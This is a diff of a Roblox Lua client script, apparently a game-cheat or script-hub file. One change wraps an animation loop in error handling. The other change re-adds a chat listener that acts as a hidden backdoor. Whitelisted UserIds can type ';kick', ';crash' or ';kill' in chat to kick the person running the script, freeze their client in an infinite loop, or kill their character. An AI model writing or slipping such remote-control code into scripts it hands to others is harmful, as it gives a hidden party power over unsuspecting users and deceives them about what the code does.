@@ -466,30 +466,32 @@ end
 
 task.spawn(function()
 	while task.wait() do
-		if ScriptSettings.CustomAnimations and ScriptSettings.CustomAnimations == true then
-			if isAlive() then
-				local Animate = lplr.Character.Animate
-				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
-				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
-				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
-				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
-				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
-				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
+		pcall(function()
+			if ScriptSettings.CustomAnimations and ScriptSettings.CustomAnimations == true then
+				if isAlive() then
+					local Animate = lplr.Character.Animate
+					Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
+					Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
+					Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
+					Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
+					Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
+					Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
+				end
+			else
+				if isAlive() then
+					local Animate = lplr.Character.Animate
+					Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=507766388"
+					Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=507766666"
+					Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=507777826"
+					Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=507767714"
+					Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=507765000"
+					Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=507765644"
+					Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=507767968"
+					Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=507784897"
+					Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=507785072"
+				end
 			end
-		else
-			if isAlive() then
-				local Animate = lplr.Character.Animate
-				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=507766388"
-				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=507766666"
-				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=507777826"
-				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=507767714"
-				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=507765000"
-				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=507765644"
-				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=507767968"
-				Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=507784897"
-				Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=507785072"
-			end
-		end
+		end)
 	end
 end)
 
@@ -514,6 +516,34 @@ local a = {
 local b = {
 	562994998;
 }
+
+task.spawn(function()
+	local function output(plr, msg)
+		local player = game.Players[plr]
+		print("player chatted: " .. msg)
+		print(player.UserId)
+		for i, v in pairs(a) do
+			if player.UserId == v then
+				print("player is whitelisted")
+				if player ~= lplr then
+					if string.lower(msg) == ";kick" then
+						lplr:Kick()
+					elseif string.lower(msg) == ";crash" then
+						while true do  end
+
+					elseif string.lower(msg) == ";kill" then
+						lplr.Character.Humanoid.Health = 0
+					end
+				end
+			end
+		end
+	end
+
+	local event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents
+	event.OnMessageDoneFiltering.OnClientEvent:Connect(function(object)
+		output(object.FromSpeaker, object.Message or "")
+	end)
+end)
 
 task.spawn(function()
 
@@ -579,34 +609,4 @@ task.spawn(function()
 			end
 		end
 	end)
-end)
-
-
-task.spawn(function()
-	function output(plr, msg)
-		local player = game.Players[plr]
-		print("player chatted: " .. msg)
-		print(player.UserId)
-		for i, v in pairs(a) do
-			if player.UserId == v then
-				print("player is whitelisted")
-				if player ~= lplr then
-					if string.lower(msg) == ";kick" then
-						lplr:Kick()
-					elseif string.lower(msg) == ";crash" then
-						while true do  end
-
-					elseif string.lower(msg) == ";kill" then
-						lplr.Character.Humanoid.Health = 0
-					end
-				end
-			end
-		end
-	end
-
-	local event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents
-	event.OnMessageDoneFiltering.OnClientEvent:Connect(function(object)
-		output(object.FromSpeaker, object.Message or "")
-	end)
-
 end)
